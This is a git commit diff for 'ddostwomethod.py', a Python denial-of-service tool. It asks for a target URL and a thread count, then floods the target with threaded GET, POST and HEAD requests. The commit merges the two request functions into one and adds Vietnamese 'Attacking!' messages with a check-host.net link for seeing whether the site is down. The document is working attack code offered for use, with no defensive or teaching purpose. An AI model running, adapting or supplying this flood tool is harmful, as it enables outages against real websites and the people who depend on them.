65c0dbe232143d16303b2d7e695b86d0b1cc47ec
Khangphan <102360362+KhangPhan27@users.noreply.github.com>
2022-10-23 12:05:14 +0700

    Update ddostwomethod.py

--- ddostwomethod.py
+++ ddostwomethod.py
@@ -8,39 +8,33 @@ os.system("clear")
 url=input('URL:')
 thread=int(input('Thread:'))
 os.system("clear")
+print('Đang tấn công! Truy cập vào: https://check-host.net/check-http?host='+url)
+print('https://check-host.net/check-http?host='+url)
+print('để kiểm tra trạng thái web.')
 def request_10000_async():
     start = time.perf_counter()
     client = requests.Session()
 
  
     	
-    def requestpost(secret_number):
-        client.post(url.format(secret_number))
-        req=requests.get(url).status_code
-        if req==200:
-        	print(Fore.WHITE+'Status code:', req,' Method:GET')
-        else:
-        	 print(Fore.RED+'Status code:', req,' Method:GET')
     def request(secret_number):
-        client.get(url.format(secret_number))
-        req=requests.get(url).status_code
-        if req==200:
-        	print(Fore.WHITE+'Status code:', req,' Method:POST')
-        else:
-        	 print(Fore.RED+'Status code:', req,' Method:POST')
+        client.get(url.format(secret_number), timeout=10000)
+        client.post(url.format(secret_number), timeout=10000)
+        client.head(url.format(secret_number), timeout=10000)
+        requests.get(url.format(secret_number), timeout=10000)
+        req=requests.post(url).status_code
+        
+    
      
 
 
     tasks = []
-    
     for secret in range(thread):
         # Tạo thread và khởi động chúng
         task = threading.Thread(target=request, args=(secret,))       
         task.start()
         tasks.append(task)
-        rq2 = threading.Thread(target=requestpost, args=(secret,))        
-        rq2.start()
-        tasks.append(rq2)
+        
     
     # Đợi tất cả thread thực thi xong
     
